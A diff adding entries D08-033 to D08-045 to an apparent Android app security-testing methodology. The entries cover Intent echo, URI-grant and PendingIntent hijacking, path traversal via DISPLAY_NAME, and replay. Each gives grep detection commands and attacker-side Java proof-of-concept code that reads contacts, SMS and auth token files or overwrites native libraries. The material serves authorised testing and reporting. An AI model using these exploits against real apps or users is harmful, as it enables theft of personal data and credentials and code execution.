@@ -1320,3 +1320,1058 @@ that the attacker cannot reach directly?**
   demonstrated gadget; otherwise state "logic forgery" and keep it at Medium.
 - **Ruled out when:** Every `getSerializableExtra` uses the typed overload, or no exported component
   deserialises at all, or the app ships an `ObjectInputFilter` allow-list on the path.
+
+### D08-033 · `setResult(RESULT_OK, getIntent())` — the full-Intent echo
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields an API token; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 |
+| **Applies to** | all. `android:grantUriPermissions="true"` on a non-exported provider is what makes the victim's **own** providers reachable this way; the `<provider>` default for that attribute is `"false"` |
+| **Maps to** | Oversecured "Gaining access to arbitrary Content Providers" — the four vectors (direct intent return, implicit-intent interception with `priority="999"`, `onActivityResult` substitution, permission capture via a `READ_CONTACTS`-holding app) and the remediation line "Developers should never redirect Intents in full"; H1 #272044 (Dropbox, "Android - Access of some not exported content providers", $1000); MASTG-KNOW-0117; CWE-926 |
+
+- **Test:** An exported activity that returns the incoming Intent as its result also returns the URI grants
+  that Intent carried, backed by the target's authority. This is the cheapest Critical in the chapter: one
+  grep, one `startActivityForResult`, and it bypasses `exported="false"` on providers entirely without
+  needing a nested-intent forwarder anywhere in the app. The minimal vulnerable shape:
+  ```java
+  protected void onCreate(Bundle b) { setResult(-1, getIntent()); finish(); }
+  ```
+- **How:**
+  ```bash
+  grep -rnE 'setResult\([^,)]*,\s*getIntent\(\)\)|setResult\(-1,\s*getIntent\(\)\)|setResult\([^,)]*,\s*intent\)' out/sources/
+  grep -rn 'setResult(' out/sources/ -B4 -A4 | grep -nE 'getParcelableExtra|getData\(\)|FLAG_GRANT'
+  ```
+  Attacker side:
+  ```java
+  Intent i = new Intent().setClassName("com.target.app", "com.target.app.EchoActivity");
+  i.setData(Uri.parse("content://com.target.app.internal/secrets"));
+  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
+           | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
+           | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
+  startActivityForResult(i, 1);
+  // onActivityResult:
+  try (InputStream in = getContentResolver().openInputStream(data.getData())) { /* dump */ }
+  ```
+- **Proof:** `getContentResolver().query(returnedUri, …)` (or `openInputStream`) succeeding in your process
+  where the identical call fails without the round trip. That delta is the whole finding — show both, and
+  show `dumpsys activity providers | grep -A5 UriPermission` listing your package.
+- **Escalation:** D08-034 for the system-provider variant; D08-012 to make it persistent; → D07 for what
+  the provider holds; → D11/D13 once you have the token file.
+- **Ruled out when:** No `setResult` receives `getIntent()` or a derivative of it, every result Intent is a
+  freshly constructed object carrying only named extras, and `dumpsys activity providers` shows no grant to
+  your package after the round trip.
+
+### D08-034 · Echo or redirect aimed at a system provider the victim holds permission for
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — rated on the data) |
+| **Attacker** | AM-03 (the attacker holds **no** runtime permissions) |
+| **Applies to** | all apps that hold a dangerous permission — contacts, SMS, call log, calendar, media |
+| **Maps to** | Oversecured "Gaining access to arbitrary Content Providers" vector 4 (permission capture via a permission-holding app); ATT&CK T1409 Stored Application Data; `risks/content-resolver` (`belongsToCurrentApplication()`, `isExported()`, `checkUriPermission()` are the documented validators whose absence is the bug) |
+
+- **Test:** The echo and the forward do not only re-delegate the victim's *own* provider access. They
+  re-delegate every runtime permission the victim holds, because the grant is computed against the victim's
+  UID. Enumerate what the target holds, then aim the primitive at the matching system authority.
+- **How:**
+  ```bash
+  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
+  ```
+  Then, through whichever primitive you proved (D08-033 or D08-007):
+  ```java
+  i.setData(Uri.parse("content://com.android.contacts/data"));          // victim holds READ_CONTACTS
+  // or ContactsContract.RawContacts.CONTENT_URI, content://sms, content://call_log/calls
+  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+  ```
+  Also test the proxy-read direction, where the victim reads for you and renders or uploads the result:
+  ```bash
+  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
+  ```
+- **Proof:** Rows from a system provider dumped in the attacker process, with the attacker's manifest
+  showing **only** `INTERNET`. Log the first few rows (masking the values, keeping the column names — the
+  triager needs the JSON/column keys, not the PII). Then `adb shell dumpsys package com.attacker.poc` to
+  show no dangerous permission granted.
+- **Escalation:** Contacts/SMS/call-log disclosure by a zero-permission app is a privacy P1-class narrative
+  on most programmes; → D20 for the privacy framing, → D13 if the SMS provider yields an OTP.
+- **Ruled out when:** The target holds no dangerous runtime permission (record `dumpsys package` output),
+  or the primitive validates the data URI's authority against `belongsToCurrentApplication()` /
+  `isExported()` / `checkUriPermission()` before acting.
+
+### D08-035 · `onActivityResult` trusting a third-party result Intent — the reverse direction
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 + one user tap (the picker/chooser) |
+| **Applies to** | all apps that call `ACTION_GET_CONTENT`, `ACTION_OPEN_DOCUMENT`, `ACTION_PICK`, `IMAGE_CAPTURE`, or any share/import flow |
+| **Maps to** | MASTG-TEST-0375 (Missing Validation of Data Returned from Implicit Intents), MASWE-0050 (CWE-20, CWE-22, CWE-73, CWE-345), MASTG-KNOW-0138 (URI Schemes in Android Intent Results), MASTG-KNOW-0025, MASTG-BEST-0057, MASTG-TECH-0043 |
+
+- **Test:** Everyone tests the app as a *receiver* of intents. The responder side is the one nobody
+  reviews: when the app asks another app for content, the **responder controls** `Intent.getData()`,
+  `ClipData`, the extras and any provider metadata the caller then queries. Treating that as trusted is the
+  bug, and it runs with the caller's own filesystem identity.
+- **How:**
+  ```bash
+  grep -rn 'startActivityForResult\|ActivityResultLauncher\|registerForActivityResult\|onActivityResult' out/sources/
+  grep -rn 'getData()\|getClipData()\|openInputStream\|contentResolver.query\|OpenableColumns.DISPLAY_NAME' out/sources/
+  ```
+  Register a hostile responder in the stub app with a matching filter and `android:priority="999"`:
+  ```xml
+  <activity android:name=".Responder" android:exported="true">
+    <intent-filter android:priority="999">
+      <action android:name="android.intent.action.GET_CONTENT"/>
+      <category android:name="android.intent.category.OPENABLE"/>
+      <category android:name="android.intent.category.DEFAULT"/>
+      <data android:mimeType="*/*"/>
+    </intent-filter>
+  </activity>
+  ```
+  ```java
+  setResult(-1, new Intent().setData(
+      Uri.parse("file:///data/user/0/com.target.app/shared_prefs/auth.xml")));
+  finish();
+  ```
+- **Proof:** The victim reading or uploading that path — the outbound request body in Burp, a Frida trace
+  of `openInputStream`, or the copied file found afterwards in `getExternalCacheDir()`. A `content://`
+  URI is resolved with the **provider's** identity; a `file://` URI is read with the **caller's own**
+  process identity and filesystem permissions, which is why case 1 is a sandbox read.
+- **Escalation:** → D11 token theft → D13/D15. See D08-036 for the write-side variant.
+- **Ruled out when:** The result handler rejects any scheme other than `content://`, resolves the authority
+  and refuses one that is not in an allow-list, and never constructs a local path from responder-supplied
+  metadata. `file://` sharing throws `FileUriExposedException` on API 24+ **on the sender's side** — the
+  attacker relaxes that with `StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX)` in their own app, so the
+  victim's API level does not rule this out.
+
+### D08-036 · Path traversal via `OpenableColumns.DISPLAY_NAME` from a hostile provider
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loaded library or DEX; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 + one user tap |
+| **Applies to** | all apps that accept shared files |
+| **Maps to** | `risks/untrustworthy-contentprovider-provided-filename` — **CWE-73: External Control of Filename or Path**, impact listed as "Malicious code execution — overwrite application executables or DEX files"; MASTG-KNOW-0138 (the `File(dir, name)` → `../lib-main/lib.so` example); MASTG-TEST-0375; MASWE-0050 |
+
+- **Test:** The inverse of the usual provider test, and the single most commonly missed one. The victim
+  queries your provider for `OpenableColumns.DISPLAY_NAME` to name the file it is about to write. You
+  return `../../lib-main/lib.so` and `new File(context.getFilesDir(), name)` resolves it normally — an
+  arbitrary write inside the victim's sandbox.
+- **How:**
+  ```bash
+  grep -rnE 'OpenableColumns|DISPLAY_NAME|getColumnIndex\(.*DISPLAY_NAME' out/sources/
+  grep -rn 'new File(' out/sources/ | grep -iE 'displayname|filename|name'
+  grep -rn 'getCanonicalPath\(\)\.startsWith' out/sources/     # the fix; absence is the bug
+  ```
+  In the stub provider's `query()`:
+  ```java
+  MatrixCursor c = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
+  c.addRow(new Object[]{"../lib-main/lib.so", payload.length});
+  return c;
+  ```
+- **Proof:** After the share, `adb shell run-as com.target.app ls -l files/ lib-main/` (debuggable build)
+  showing your file at the traversed path, or a behaviour change proving the overwritten file took effect.
+  The control: a benign `DISPLAY_NAME` writes to the expected directory.
+- **Escalation:** → D17: overwrite a `.dex`/`.jar`/`.so` the app later loads → persistent code execution as
+  the victim. Match the write destination against the load source:
+  ```bash
+  grep -rn 'DexClassLoader\|PathClassLoader\|System.load(\|System.loadLibrary(\|createPackageContext' out/sources/
+  grep -rn 'getDir(\|getFilesDir()\|getCodeCacheDir()\|nativeLibraryDir' out/sources/
+  ```
+  If no code-load path consumes the writable directory, keep the base severity and state the ceiling
+  separately: "High; ceiling = RCE **if** a writable code-load path exists — not shown."
+- **Ruled out when:** The app canonicalises and prefix-checks
+  (`getCanonicalPath().startsWith(targetDir.getCanonicalPath() + File.separator)`) before writing, or
+  discards `DISPLAY_NAME` entirely and generates its own filename.
+
+### D08-037 · Mutable `PendingIntent` with a blank or implicit base Intent
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) or `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the fired action is authenticated |
+| **Attacker** | AM-03; AM-04 when acquisition needs the notification-listener grant (D08-040) |
+| **Applies to** | **LEGACY default:** below API 31 `PendingIntent` objects were mutable by default, so an omitted flags argument is the vulnerable case. From targetSdk 31 mutability must be declared explicitly or creation throws `IllegalArgumentException` — so on a modern target an explicit `FLAG_MUTABLE` is the thing to hunt, and it is a deliberate developer choice |
+| **Maps to** | MASTG-TEST-0381 (References to Insecure PendingIntent Creation), MASTG-KNOW-0024, MASTG-BEST-0063, rule `mastg-android-pendingintent-mutable`, MASTG-TEST-0030 (deprecated predecessor, source of the Frida hook); MASWE-0032 (CWE-927, CWE-940); **CVE-2020-0389 / A-156959408** (base intent implicit *and* PendingIntent mutable); `risks/pending-intent`; Google Play ASI "Implicit PendingIntent" campaign (2022-02-22); mindedsecurity `MSTG-PLATFORM-4_1`; QARK `implicit_intent_to_pending_intent.py`; Google Mobile VRP "Vulnerabilities caused by unsafe usage of pending intents" |
+
+- **Test:** AOSP's own javadoc: "By giving a PendingIntent to another application, you are granting it the
+  right to perform the operation you have specified as if the other application was yourself (with the same
+  permissions and identity)." Mutable means the holder can `fillIn()` the unset fields; an implicit or
+  blank base intent means the *component* is one of them. Together that is arbitrary component invocation
+  as the victim.
+- **How:**
+  ```bash
+  semgrep --config rules/mastg-android-pendingintent-mutable.yml out/sources/
+  # the rule flags a flags argument of: 0, 134217728 (FLAG_UPDATE_CURRENT), 33554432 (FLAG_MUTABLE),
+  # 0x08000000, 0x02000000, PendingIntent.FLAG_UPDATE_CURRENT, PendingIntent.FLAG_MUTABLE
+  grep -rnE 'PendingIntent\.(getActivity|getActivities|getBroadcast|getService|getForegroundService)\s*\(' out/sources/ -A4 \
+    | grep -vE 'FLAG_IMMUTABLE'
+  # for each hit read the base Intent construction — the dangerous shape is new Intent() with no component
+  grep -rn -B8 'PendingIntent.get' out/sources/ | grep -E 'new Intent\(|setClass|setComponent|setClassName|setPackage'
+  grep -rn 'FLAG_MUTABLE\|FLAG_IMMUTABLE\|FLAG_ONE_SHOT\|FLAG_UPDATE_CURRENT\|FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/
+  ```
+  Flag values for a smali/obfuscated read: `FLAG_MUTABLE 0x02000000` (33554432),
+  `FLAG_IMMUTABLE 0x04000000` (67108864), `FLAG_UPDATE_CURRENT 0x08000000` (134217728),
+  `FLAG_ONE_SHOT 0x40000000`. Build-log tell: lint `UnspecifiedImmutableFlag`.
+  Exploit once you hold the token:
+  ```java
+  Intent fill = new Intent();
+  fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
+  fill.setData(Uri.parse("content://com.target.app.internalprovider/secrets"));
+  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+  pi.send(context, 0, fill);            // executes with the VICTIM's identity
+  ```
+- **Proof:** The victim's non-exported component starting — `dumpsys activity activities` naming it as
+  resumed while a direct `am start -n` on the same component is refused with `Permission Denial` — and
+  `Binder.getCallingUid()` inside it reporting the **victim's** uid, not yours (hook it with Frida so the
+  confused deputy is explicit). Pair with the D08-003 census line showing `immutable=false` and no `cmp=`.
+- **Escalation:** → D08-052 to make the send issue a URI grant; → D06 to start a permission-protected
+  service; → D15 to perform a backend action as the victim.
+- **Ruled out when:** Every `PendingIntent.get*` call passes `FLAG_IMMUTABLE`, **or** passes `FLAG_MUTABLE`
+  with a base intent that sets an explicit `ComponentName` and whose remaining fillable fields (data,
+  extras) are unused by the target component. Check the base intent, never the flag alone. Note the
+  legitimate exception: inline reply genuinely requires mutability (D08-044).
+
+### D08-038 · Mutable `PendingIntent` with `setPackage()` only — the targetSdk-34-compliant variant
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
+| **Attacker** | AM-03, AM-04 |
+| **Applies to** | targetSdk 34+ |
+| **Maps to** | `about/versions/14/behavior-changes-14` — "Mutable pending intents with unspecified component/package throw an exception"; the documented "SUCCEEDS" example is `setPackage(context.packageName)`; `risks/pending-intent`; compat change `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` (id `236704164L`) |
+
+- **Test:** Android 14's check is satisfied by a package alone. That narrows your target set to the
+  victim's own components — which is exactly the set you wanted, because it includes every non-exported
+  one. Do not read the Android 14 hardening as a closure of the class; read it as a hint about which
+  payload shape to build.
+- **How:**
+  ```bash
+  grep -rn -B2 -A6 'FLAG_MUTABLE' out/sources/ | grep -n 'setPackage('
+  # negative tell: the exception when the app got it wrong
+  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent'
+  ```
+  The injected `ComponentName` must be inside the victim package:
+  ```java
+  pi.send(ctx, 0, new Intent().setClassName("com.target.app", "com.target.app.internal.AdminActivity"));
+  ```
+- **Proof:** The victim's non-exported internal activity/receiver starting from your `send()`. Use this
+  item as a **rule-in**: if the app targets 34+ and still ships a mutable PendingIntent, it necessarily has
+  a component or package set, so your attack is the fill-in-the-remaining-fields variant, not full
+  retargeting. Saying that in the report shows you understand the platform and pre-empts the vendor's first
+  objection.
+- **Escalation:** As D08-037.
+- **Ruled out when:** Every mutable PendingIntent sets a full `ComponentName` **and** the named component
+  ignores the fillable fields (no use of `getData()`, `getExtras()` or `getAction()` from the delivered
+  intent). Confirm by reading the component, not the builder.
+
+### D08-039 · `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT` present
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
+| **Attacker** | AM-03 |
+| **Applies to** | targetSdk 34+ (Android 14) |
+| **Maps to** | `about/versions/14/behavior-changes-14`; `risks/pending-intent`; compat change `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` (id `236704164L`) blocks creating a mutable PendingIntent wrapping an implicit intent for apps targeting U/API 34+ |
+
+- **Test:** Android 14 blocks the mutable-plus-implicit combination. `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT`
+  is the documented opt-out. Any app that sets it has told you, in code, that it is knowingly shipping the
+  exact shape the platform blocks — treat it as a priority target.
+- **How:**
+  ```bash
+  grep -rn 'FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/ out/smali*/
+  adb shell am compat enable BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT com.target.app   # debuggable build
+  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent|BLOCK_MUTABLE_IMPLICIT'
+  ```
+- **Proof:** The call site plus the D08-037 exploitation of that specific PendingIntent. Its presence alone
+  is a finding worth stating, but do not file it alone — file it as the lede of the redirection report, the
+  same way you do with `removeLaunchSecurityProtection()`.
+- **Escalation:** As D08-037.
+- **Ruled out when:** The flag appears nowhere in `sources/` or `smali*/`, and enabling
+  `BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT` produces no `IllegalArgumentException` while the app is driven
+  through every notification, widget and alarm path.
+
+### D08-040 · PendingIntent harvested from a notification by a `NotificationListenerService`
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
+| **Attacker** | AM-04 (needs the user to enable the listener — state the precondition explicitly) |
+| **Applies to** | all |
+| **Maps to** | MASTG-KNOW-0024 — "a malicious application with `android.permission.BIND_NOTIFICATION_LISTENER_SERVICE` can bind to the notification listener service and retrieve the pending intent"; MASTG-TEST-0381, MASTG-TEST-0315; `risks/sender-of-pending-intents` (names `NotificationListenerService` as *the* acquisition vector); ATT&CK T1517 Access Notifications; H1 #1161401 (Nextcloud, Low 1.3, $250 — the "Download complete" notification's implicit PendingIntent, re-sent with `packageName` and `clipData` set, inheriting `com.nextcloud.client`'s CONTACTS permission) |
+
+- **Test:** The acquisition half. A mutable PendingIntent is only a finding if you can reach it. The
+  notification drawer is the most reliable route and needs one user grant — which banking trojans routinely
+  obtain, so it is a realistic precondition, not a theoretical one.
+- **How:**
+  ```bash
+  grep -rn 'setContentIntent\|addAction\|NotificationCompat.Builder\|Notification.Builder' out/sources/
+  adb shell dumpsys notification --noredact | grep -iE 'pkg=com.target.app' -A12
+  adb shell cmd notification allow_listener com.attacker.poc/.Listener
+  ```
+  In the stub listener:
+  ```java
+  public void onNotificationPosted(StatusBarNotification sbn) {
+    Notification n = sbn.getNotification();
+    PendingIntent pi = n.contentIntent;                       // or n.actions[i].actionIntent
+    Log.i("D08", sbn.getPackageName() + " creator=" + pi.getCreatorPackage());
+    Intent fill = new Intent();
+    fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
+    fill.setData(Uri.parse("content://com.android.contacts/data"));
+    fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+    try { pi.send(this, 0, fill); } catch (Exception e) { Log.e("D08", "", e); }
+  }
+  ```
+  ```bash
+  adb logcat | grep -E 'D08|sbn'
+  ```
+- **Proof:** The victim app performing the wrapped action, or handing over a granted URI, triggered from
+  your listener process. Contact records in your log read by an app that never requested `READ_CONTACTS` is
+  the clean version.
+- **Escalation:** → D24 for notification-content theft; → D13 if the notification carries an OTP. Pair with
+  a tapjacking PoC (D04) only if the programme prices user interaction — otherwise state the precondition
+  and let it lower the rating honestly. Nextcloud's report rated **Low 1.3** precisely because of this
+  precondition; the same class rates far higher where no special grant is needed.
+- **Ruled out when:** Every notification PendingIntent is `FLAG_IMMUTABLE` with an explicit component
+  (verified in the D08-003 census, not the source), or the app posts no notifications carrying actionable
+  PendingIntents. Victim-side mitigations to note: `FLAG_IMMUTABLE` plus `FLAG_ONE_SHOT`, and keeping the
+  OTP out of the notification text.
+
+### D08-041 · `getCreatorPackage()` / `getCreatorUid()` used to authenticate the *sender*
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the gated branch is an auth decision |
+| **Attacker** | AM-04 (acquisition via notification listener), AM-03 where the PendingIntent is handed out through an exported component |
+| **Applies to** | all. The `getSentFromUid()` remedy is **API 34+** only, so pre-34 apps have no clean receiver-side fix — which is why the broken pattern persists |
+| **Maps to** | `risks/sender-of-pending-intents` — "`PendingIntent.getCreator*()` and `PendingIntent.getTarget*()` return the creator … not its sender", "The creator does not always match the sender"; impact listed as authentication bypass, privilege escalation, and "Remote Code Execution: depending on implementation"; documented alternatives `Binder.getCallingUid()` + `PackageManager.getPackagesForUid()`, or `BroadcastReceiver.getSentFromUid()` / `getSentFromPackage()` on API 34+ with `BroadcastOptions.setShareIdentityEnabled(true)`; MASVS-CODE |
+
+- **Test:** The receiving side of the class. An app that takes a `PendingIntent` from elsewhere and decides
+  whether to act on it by calling `getCreatorPackage()`/`getCreatorUid()` is checking who **created** the
+  token, not who **sent** it. Any app that can obtain a legitimately created PendingIntent — notably via a
+  notification listener — becomes the sender while the creator stays trusted.
+- **How:**
+  ```bash
+  grep -rnE 'getCreatorPackage|getCreatorUid|getTargetPackage|getIntentSender' out/sources/ -B4 -A8
+  ```
+  For each hit determine whether the result feeds an `if` that gates a privileged action. Then relay:
+  ```java
+  StatusBarNotification sbn = getActiveNotifications()[0];
+  PendingIntent pi = sbn.getNotification().contentIntent;   // created by the trusted app
+  Intent handoff = new Intent().setClassName("com.target.app", "com.target.app.PiReceiver");
+  handoff.putExtra("pi", pi);
+  startActivity(handoff);                                    // sent by YOU
+  ```
+- **Proof:** The victim taking the creator-gated branch while the sending process is yours — a logcat line
+  from the victim's handler captured alongside `adb shell ps | grep com.attacker.poc` showing your PID as
+  the caller. The clean framing: creator says `com.trusted`, sender is `com.attacker.poc`, branch executed.
+- **Escalation:** → D13 auth bypass; → D06 if the gated path is a bound service. This is the
+  notification-listener × PendingIntent join in D28.
+- **Ruled out when:** Every authorisation decision on a received PendingIntent uses `Binder.getCallingUid()`
+  inside a Service or ContentProvider dispatch (plus `getPackagesForUid()` **and** a signature check), or
+  `BroadcastReceiver.getSentFromUid()`/`getSentFromPackage()` on API 34+. A `getCreatorPackage()` used only
+  for logging or telemetry is a true negative — confirm it does not reach a branch.
+
+### D08-042 · Missing `FLAG_ONE_SHOT` on a non-idempotent PendingIntent → replay
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null); financial replay argues into the programme's payment category |
+| **Attacker** | AM-03, AM-04 |
+| **Applies to** | all |
+| **Maps to** | `risks/pending-intent#risk_replaying_pending_intents` — "PendingIntents can be replayed unless the `FLAG_ONE_SHOT` flag is set"; AOSP `PendingIntent.java` — `FLAG_ONE_SHOT`: "this PendingIntent can be used only once … after `send()` is called on it, it will be automatically canceled", and the documented risk that an attacker "could capture and re-use the intent to repeat actions that should only be able to be done once (e.g., one-time transactions, account verifications)"; mindedsecurity `MSTG-PLATFORM-4_2` (bitmask test `$D & 0x40000000 > 0`) |
+
+- **Test:** A PendingIntent representing a one-time action — confirm payment, consume a voucher, complete a
+  transfer, verify an account — that is not created with `FLAG_ONE_SHOT` (0x40000000) can be fired
+  repeatedly by anyone who obtains it. This is orthogonal to mutability: an **immutable** PendingIntent is
+  still replayable.
+- **How:**
+  ```bash
+  grep -rn 'PendingIntent.get' out/sources/ | grep -v 'FLAG_ONE_SHOT'
+  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|verify|voucher|coupon|redeem'
+  ```
+  Use the D08-003 Frida census to read the flags bitmask at creation, then capture the token (notification,
+  widget, alarm, exported extra) and:
+  ```java
+  for (int i = 0; i < 5; i++) { pi.send(); Thread.sleep(500); }
+  ```
+- **Proof:** N backend transactions, N verification events or N state changes from one user action, visible
+  in the app's own transaction list and in the proxy history. Show the request count, not just a
+  screenshot: this is a state-change finding, so use the five-screenshot pattern (D08-066).
+- **Escalation:** → D23 payment fraud; see D08-050 for the payment-specific composition.
+- **Ruled out when:** Every PendingIntent representing a non-idempotent action carries `FLAG_ONE_SHOT`,
+  **or** the backend enforces idempotency server-side (an idempotency key, a one-time nonce, or a state
+  machine that rejects the second call) — prove that by replaying and showing the second request rejected,
+  not by reading the client.
+
+### D08-043 · `filterEquals()` + constant `requestCode` collision, with or without `FLAG_UPDATE_CURRENT`
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the misroute exposes another user's content; `broken_access_control.privilege_escalation` (null) otherwise |
+| **Attacker** | AM-05 (another user of the same app) for the misrouted-message variant; AM-03 for the extras-swap variant |
+| **Applies to** | all |
+| **Maps to** | AOSP `PendingIntent.java` javadoc, verbatim: "A common mistake people make is to create multiple PendingIntent objects with Intents that only vary in their 'extra' contents, expecting to get a different PendingIntent each time. This does not happen." Matching uses `Intent.filterEquals()` plus the `requestCode` int — extras are **not** part of identity; also "FLAG_UPDATE_CURRENT still works even if FLAG_IMMUTABLE is set"; `develop/ui/views/notifications/build-notification` — "If you reuse a `PendingIntent`, a user might reply to a different conversation than the one they intend" |
+
+- **Test:** Two `PendingIntent`s whose base intents are `filterEquals()`-equal and whose request codes
+  match are the **same object**. Extras do not disambiguate them. So a per-conversation, per-order or
+  per-item PendingIntent built in a loop with `requestCode = 0` collides, and `FLAG_UPDATE_CURRENT` makes a
+  later creation silently rewrite the extras of every outstanding copy — including across privilege
+  contexts, and including when `FLAG_IMMUTABLE` is set.
+- **How:**
+  ```bash
+  grep -rn 'FLAG_UPDATE_CURRENT\|requestCode' out/sources/ -B4 -A2
+  # PendingIntents built in a loop with a constant request code:
+  grep -rnE 'PendingIntent\.get(Activity|Broadcast|Service)\(\s*\w+,\s*0\s*,' out/sources/ -B10
+  grep -rnE 'PendingIntent\.get(Activity|Service|Broadcast)\([^,]+,\s*([0-9]+)' out/sources/ -A4 | grep -n 'FLAG_UPDATE_CURRENT'
+  ```
+  The D08-003 hook prints `rc=` per creation — a constant value across items is the tell. Reproduce:
+  post two notifications (or open two orders), act on the second, observe which one the backend sees.
+- **Proof:** Replying to conversation A delivers to conversation B, or confirming order A charges order B —
+  captured in the backend request, not inferred. Two notifications, one misrouted action, one proxy
+  request naming the wrong object id.
+- **Escalation:** → D24 cross-conversation message disclosure; → D23 when it is an order or a payment.
+  **Important on Android 15+:** force-stop cancels all of an app's pending intents, so do not force-stop
+  between setup and trigger (D08-051).
+- **Ruled out when:** Every per-item PendingIntent uses a unique `requestCode` derived from the item id
+  (read the derivation, and confirm it with the census `rc=` values), or the base intents differ under
+  `filterEquals()` by action or data URI rather than only by extras.
+
+### D08-044 · Direct-reply `RemoteInput` PendingIntent — legitimately mutable, so audit what that exposes
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the misroute; `broken_access_control.privilege_escalation` (null) for the retarget |
+| **Attacker** | AM-04 |
+| **Applies to** | all messaging, ticketing and support apps with inline reply |
+| **Maps to** | `develop/ui/views/notifications/build-notification` (the `FLAG_MUTABLE` requirement for direct reply and the requestCode caution); AOSP `PendingIntent.java`; `risks/sender-of-pending-intents` |
+
+- **Test:** Direct reply genuinely requires `FLAG_MUTABLE` — the system fills in the typed text. That means
+  every direct-reply notification ships a mutable PendingIntent that a notification listener can obtain and
+  `send()` with an arbitrary fill-in. The mitigation is not immutability; it is a tightly specified base
+  intent (explicit component **and** package) plus a per-conversation `requestCode`. Do not report "mutable
+  PendingIntent" here without that analysis — you will be correctly rebutted.
+- **How:**
+  ```bash
+  grep -rn -B10 -A4 'RemoteInput\|addRemoteInput\|KEY_TEXT_REPLY' out/sources/
+  # verify the base Intent sets a component AND a unique requestCode per conversation
+  ```
+  Then, from the listener stub, capture the reply PendingIntent and fill in a *different* conversation id
+  or a different data URI:
+  ```java
+  Intent fill = new Intent();
+  fill.putExtra("conversation_id", victimOtherThreadId);
+  RemoteInput.addResultsToIntent(action.getRemoteInputs(), fill, results);
+  action.actionIntent.send(ctx, 0, fill);
+  ```
+- **Proof:** The message delivered to the wrong recipient, or a component other than the reply handler
+  invoked — visible in the backend request and in the other user's thread.
+- **Escalation:** → D24; → D08-043 when the collision is the mechanism.
+- **Ruled out when:** The reply PendingIntent's base intent sets an explicit `ComponentName`, the target
+  conversation is encoded in the **base** intent (not fillable), and the `requestCode` is per-conversation.
+  All three, verified from the census output.
+
+### D08-045 · Widget `setPendingIntentTemplate()` with an attacker-influenced `fillInIntent`
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null) |
+| **Attacker** | AM-09 (server content chooses the launch target), AM-03 where the item data comes from an exported provider or the app's cache |
+| **Applies to** | apps with collection-based widgets |
+| **Maps to** | `develop/ui/views/appwidgets` (`setOnClickPendingIntent`, `setPendingIntentTemplate` plus fill-in for collections); `risks/pending-intent`; MASWE-0032 |
+
+- **Test:** Collection widgets use one template PendingIntent plus a per-item `fillInIntent`. The
+  template's unfilled fields are precisely what the fill-in may supply. If the template omits the component
+  or the action, the fill-in supplies it — and widget item data frequently originates from server content
+  or from the app's own cache. So *content* controls a launch. Widget code lives outside the main feature
+  tree, which is why it is rarely reviewed.
+- **How:**
+  ```bash
+  grep -rnE 'setPendingIntentTemplate|setOnClickFillInIntent|setOnFillInIntent|RemoteViewsService|RemoteViewsFactory|getViewAt\(' out/sources/ -A10
+  adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
+  ```
+  For each `setPendingIntentTemplate`, read the base Intent: does it set component **and** action, or only
+  an action? Then feed the widget's data source a crafted item — via a MitM'd response, the app's exported
+  provider, or by writing its cache — and tap it.
+- **Proof:** The component that the injected item named launching under the app's UID
+  (`dumpsys activity activities`), with the injected item visible in the widget.
